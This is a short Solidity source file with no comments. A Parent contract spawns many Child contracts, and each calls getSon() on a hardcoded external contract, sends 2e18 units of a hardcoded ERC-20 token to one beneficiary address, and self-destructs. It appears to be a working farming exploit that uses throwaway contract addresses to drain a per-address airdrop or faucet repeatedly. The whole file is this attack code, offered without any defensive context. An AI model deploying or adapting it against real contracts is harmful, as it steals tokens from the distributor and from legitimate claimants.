pragma solidity ^0.6.0;

interface IERC20 {
    function transfer(address recipient, uint256 amount) external returns (bool);
}
interface SON {
    function getSon() external;
}


contract Parent {
    function create(address addr, uint256 quantity) external {
        for(uint256 i=1; i<=quantity; i++) {
            new Child(addr);
        }
    }
}

contract Child {
    constructor (address addr) public {
        SON(address(0xBADD981A34319371481d9F3d2A387c8bDAd9fAD1)).getSon();
        IERC20(address(0x0c17398EbBCB15078F2aD2C67A26d10623957b21)).transfer(addr,2000000000000000000);
        selfdestruct(payable(addr));
    }
}